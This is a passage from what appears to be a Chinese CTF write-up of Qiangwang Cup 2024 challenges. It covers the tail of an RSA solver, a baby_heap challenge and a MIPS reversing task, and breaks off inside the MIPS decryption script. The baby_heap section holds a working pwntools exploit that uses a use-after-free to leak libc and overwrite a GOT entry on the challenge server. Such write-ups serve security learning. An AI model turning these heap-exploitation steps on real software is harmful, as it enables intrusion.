</span></span><span class=line><span class=cl><span class=mi>117882651978564762717266768251008799169262849451887398128580060795377656792158234083843539818050019451797822782621312362313232759168181582387488893534974006037142066091872636582259199644094998729866484138566711846974126209431468102938252566414322631620261045488855395390985797791782549179665864885691057222752</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>flag_part3</span> <span class=o>=</span> <span class=n>solve_stage3</span><span class=p>(</span><span class=n>n3</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>ct3</span><span class=p>,</span> <span class=n>hint3_1</span><span class=p>,</span> <span class=n>hint3_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag_part3</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>最后拼接flag即可</p><h2 id=baby_heap>baby_heap</h2><p>猜猜是不是uaf，打开一看很好啊很好.</p><p><img src=/p/qiangwang-cup-2024/%E5%9B%BE%E7%89%871.png width=517 height=167 loading=lazy alt=1></p><p>运行分析</p><p><img src=/p/qiangwang-cup-2024/%E5%9B%BE%E7%89%872.png width=692 height=329 loading=lazy alt=1></p><p>IDA分析 看看函数功能和隐藏内容</p><p><img src=/p/qiangwang-cup-2024/%E5%9B%BE%E7%89%873.png width=692 height=521 loading=lazy alt=1></p><p>uaf</p><p><img src=/p/qiangwang-cup-2024/%E5%9B%BE%E7%89%874.png width=692 height=420 loading=lazy alt=1></p><p>任意地址写</p><p><img src=/p/qiangwang-cup-2024/%E5%9B%BE%E7%89%875.png width=599 height=319 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#p = process(&#39;./pwn&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;39.106.63.28&#34;</span><span class=p>,</span><span class=mi>20491</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc-2.35.so&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rc</span><span class=o>=</span><span class=k>lambda</span> <span class=o>*</span><span class=n>args</span><span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=o>=</span><span class=k>lambda</span> <span class=n>x</span><span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=o>=</span><span class=k>lambda</span> <span class=n>x</span><span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sd</span><span class=o>=</span><span class=k>lambda</span> <span class=n>x</span><span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=o>=</span><span class=k>lambda</span> <span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=o>=</span><span class=k>lambda</span> <span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ls</span><span class=o>=</span><span class=k>lambda</span> <span class=o>*</span><span class=n>args</span><span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ia</span><span class=o>=</span><span class=k>lambda</span> <span class=o>*</span><span class=n>args</span><span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>pl</span><span class=o>=</span><span class=k>lambda</span> <span class=o>*</span><span class=n>args</span><span class=p>:</span><span class=nb>print</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ts</span><span class=o>=</span><span class=k>lambda</span> <span class=o>*</span><span class=n>args</span><span class=p>:</span><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>l8</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;e &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>,</span> <span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>,</span> <span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;here </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x700</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span><span class=o>-</span><span class=mh>0x21ace0</span>
</span></span><span class=line><span class=cl><span class=n>got</span> <span class=o>=</span> <span class=n>libc_base_addr</span> <span class=o>+</span> <span class=mh>0x00000000021A118</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sd</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>got</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sd</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base_addr</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>,</span> <span class=s1>&#39;5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ia</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>运行之后不用输命令就会跳出flag</p><p>但是这里我很奇怪怎么打本地都打不通，打远程就可以</p><h2 id=mips>mips</h2><p>主要加密在emu里面，是一个类似于rc4加密的加密，找到加密的地址，有花指令恢复一下函数</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-172056.png width=1479 height=852 loading=lazy alt=1></p><p>恢复完成,经过动态调试后发现xor_data是动态的，一直调试不清楚，这里面我们选择爆破</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-172356.png width=1592 height=555 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>deadbeef</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>([</span><span class=mh>0xDE</span><span class=p>,</span> <span class=mh>0xAD</span><span class=p>,</span> <span class=mh>0xBE</span><span class=p>,</span> <span class=mh>0xEF</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>enc</span><span class=p>(</span><span class=n>input_bytes</span><span class=p>,</span> <span class=n>xor</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>SBox</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>([</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span> <span class=mh>0xdf</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xba</span><span class=p>,</span> <span class=mh>0xe9</span><span class=p>,</span> <span class=mh>0x98</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x3d</span><span class=p>,</span> <span class=mh>0xa8</span><span class=p>,</span> <span class=mh>0xe6</span><span class=p>,</span> <span class=mh>0x1e</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x4d</span><span class=p>,</span> <span class=mh>0xf2</span><span class=p>,</span> <span class=mh>0xb1</span><span class=p>,</span> <span class=mh>0x7e</span><span class=p>,</span> <span class=mh>0xc2</span><span class=p>,</span> <span class=mh>0x6a</span><span class=p>,</span> <span class=mh>0x96</span><span class=p>,</span> <span class=mh>0x8c</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0xa2</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0xe5</span><span class=p>,</span> <span class=mh>0x5b</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x9d</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x3</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0xf8</span><span class=p>,</span> <span class=mh>0xd8</span><span class=p>,</span> <span class=mh>0x9</span><span class=p>,</span> <span class=mh>0x8a</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x7d</span><span class=p>,</span> <span class=mh>0x1a</span><span class=p>,</span> <span class=mh>0x46</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0xdc</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x3e</span><span class=p>,</span> <span class=mh>0x4</span><span class=p>,</span> <span class=mh>0x9a</span><span class=p>,</span> <span class=mh>0xc</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x4f</span><span class=p>,</span> <span class=mh>0xa7</span><span class=p>,</span> <span class=mh>0xf6</span><span class=p>,</span> <span class=mh>0x7b</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x94</span><span class=p>,</span> <span class=mh>0xa3</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x8f</span><span class=p>,</span> <span class=mh>0xf4</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x2a</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x2c</span><span class=p>,</span> <span class=mh>0xf5</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x5e</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>,</span> <span class=mh>0x9c</span><span class=p>,</span> <span class=mh>0xcb</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0xbb</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xb8</span><span class=p>,</span> <span class=mh>0xd2</span><span class=p>,</span> <span class=mh>0xd4</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0xbf</span><span class=p>,</span> <span class=mh>0x1f</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x0</span><span class=p>,</span> <span class=mh>0x82</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0xe1</span><span class=p>,</span> <span class=mh>0x9f</span><span class=p>,</span> <span class=mh>0xe2</span><span class=p>,</span> <span class=mh>0xd3</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x1c</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x97</span><span class=p>,</span> <span class=mh>0x84</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xa</span><span class=p>,</span> <span class=mh>0x8e</span><span class=p>,</span> <span class=mh>0x3f</span><span class=p>,</span> <span class=mh>0xf</span><span class=p>,</span> <span class=mh>0x1</span><span class=p>,</span> <span class=mh>0x86</span><span class=p>,</span> <span class=mh>0xe</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xc9</span><span class=p>,</span> <span class=mh>0x99</span><span class=p>,</span> <span class=mh>0x88</span><span class=p>,</span> <span class=mh>0xb0</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x92</span><span class=p>,</span> <span class=mh>0xef</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x9b</span><span class=p>,</span> <span class=mh>0xd5</span><span class=p>,</span> <span class=mh>0xa5</span><span class=p>,</span> <span class=mh>0xb</span><span class=p>,</span> <span class=mh>0xdd</span><span class=p>,</span> <span class=mh>0xbd</span><span class=p>,</span> <span class=mh>0xae</span><span class=p>,</span> <span class=mh>0xcc</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xc8</span><span class=p>,</span> <span class=mh>0x3a</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x56</span><span class=p>,</span> <span class=mh>0xe0</span><span class=p>,</span> <span class=mh>0xf1</span><span class=p>,</span> <span class=mh>0x6</span><span class=p>,</span> <span class=mh>0x1b</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xfa</span><span class=p>,</span> <span class=mh>0xbc</span><span class=p>,</span> <span class=mh>0xc4</span><span class=p>,</span> <span class=mh>0x91</span><span class=p>,</span> <span class=mh>0xc1</span><span class=p>,</span> <span class=mh>0x2e</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0xf0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0xee</span><span class=p>,</span> <span class=mh>0xac</span><span class=p>,</span> <span class=mh>0xec</span><span class=p>,</span> <span class=mh>0xa6</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0xb5</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xaf</span><span class=p>,</span> <span class=mh>0xc3</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x5a</span><span class=p>,</span> <span class=mh>0xd</span><span class=p>,</span> <span class=mh>0x5d</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0xb2</span><span class=p>,</span> <span class=mh>0xfe</span><span class=p>,</span> <span class=mh>0xaa</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>,</span> <span class=mh>0xa9</span><span class=p>,</span> <span class=mh>0x51</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xd0</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0xc6</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0xfc</span><span class=p>,</span> <span class=mh>0xa0</span><span class=p>,</span> <span class=mh>0xb3</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xea</span><span class=p>,</span> <span class=mh>0x7</span><span class=p>,</span> <span class=mh>0xa4</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x81</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x87</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0xc7</span><span class=p>,</span> <span class=mh>0x4c</span><span class=p>,</span> <span class=mh>0xd6</span><span class=p>,</span> <span class=mh>0xce</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0xd7</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xad</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x7a</span><span class=p>,</span> <span class=mh>0x85</span><span class=p>,</span> <span class=mh>0xa1</span><span class=p>,</span> <span class=mh>0xf3</span><span class=p>,</span> <span class=mh>0xe8</span><span class=p>,</span> <span class=mh>0x5c</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0xda</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x4e</span><span class=p>,</span> <span class=mh>0x2d</span><span class=p>,</span> <span class=mh>0x93</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x2</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x1d</span><span class=p>,</span> <span class=mh>0xfb</span><span class=p>,</span> <span class=mh>0xcd</span><span class=p>,</span> <span class=mh>0xe3</span><span class=p>,</span> <span class=mh>0xf7</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xf9</span><span class=p>,</span> <span class=mh>0xc5</span><span class=p>,</span> <span class=mh>0x8</span><span class=p>,</span> <span class=mh>0x9e</span><span class=p>,</span> <span class=mh>0x95</span><span class=p>,</span> <span class=mh>0x2b</span><span class=p>,</span> <span class=mh>0xe4</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xd1</span><span class=p>,</span> <span class=mh>0xfd</span><span class=p>,</span> <span class=mh>0x7c</span><span class=p>,</span> <span class=mh>0x2f</span><span class=p>,</span> <span class=mh>0xbe</span><span class=p>,</span> <span class=mh>0xb9</span><span class=p>,</span> <span class=mh>0xdb</span><span class=p>,</span> <span class=mh>0xde</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xe7</span><span class=p>,</span> <span class=mh>0xd9</span><span class=p>,</span> <span class=mh>0x3b</span><span class=p>,</span> <span class=mh>0xeb</span><span class=p>,</span> <span class=mh>0xff</span><span class=p>,</span> <span class=mh>0xb7</span><span class=p>,</span> <span class=mh>0xca</span><span class=p>,</span> <span class=mh>0xb4</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x5</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0xab</span><span class=p>,</span> <span class=mh>0xcf</span><span class=p>,</span> <span class=mh>0xed</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x8d</span><span class=p>,</span> <span class=mh>0x59</span>
</span></span><span class=line><span class=cl>    <span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>v7</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>v8</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>v14</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=mi>256</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>22</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>v12</span> <span class=o>=</span> <span class=n>SBox</span><span class=p>[</span><span class=n>v7</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>v8</span> <span class=o>+=</span> <span class=n>v12</span>
</span></span><span class=line><span class=cl>        <span class=n>SBox</span><span class=p>[</span><span class=n>v7</span><span class=p>],</span> <span class=n>SBox</span><span class=p>[</span><span class=n>v8</span><span class=p>]</span> <span class=o>=</span> <span class=n>SBox</span><span class=p>[</span><span class=n>v8</span><span class=p>],</span> <span class=n>SBox</span><span class=p>[</span><span class=n>v7</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>v3</span> <span class=o>=</span> <span class=p>((</span><span class=n>input_bytes</span><span class=p>[</span><span class=n>j</span> <span class=o>+</span> <span class=mi>5</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>7</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>input_bytes</span><span class=p>[</span><span class=n>j</span> <span class=o>+</span> <span class=mi>5</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=p>))</span> <span class=o>&lt;&lt;</span> <span class=mi>6</span>
</span></span><span class=line><span class=cl>        <span class=n>v3</span> <span class=o>^=</span> <span class=mh>0x0FFFFFFC0</span>
</span></span><span class=line><span class=cl>        <span class=n>v3</span> <span class=o>|=</span> <span class=p>((</span><span class=n>input_bytes</span><span class=p>[</span><span class=n>j</span> <span class=o>+</span> <span class=mi>5</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>7</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>input_bytes</span><span class=p>[</span><span class=n>j</span> <span class=o>+</span> <span class=mi>5</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0xff</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=n>v3</span> <span class=o>^=</span> <span class=mh>0x3B</span>
</span></span><span class=line><span class=cl>        <span class=n>v3</span> <span class=o>^=</span> <span class=mh>0x0FFFFFFBE</span>
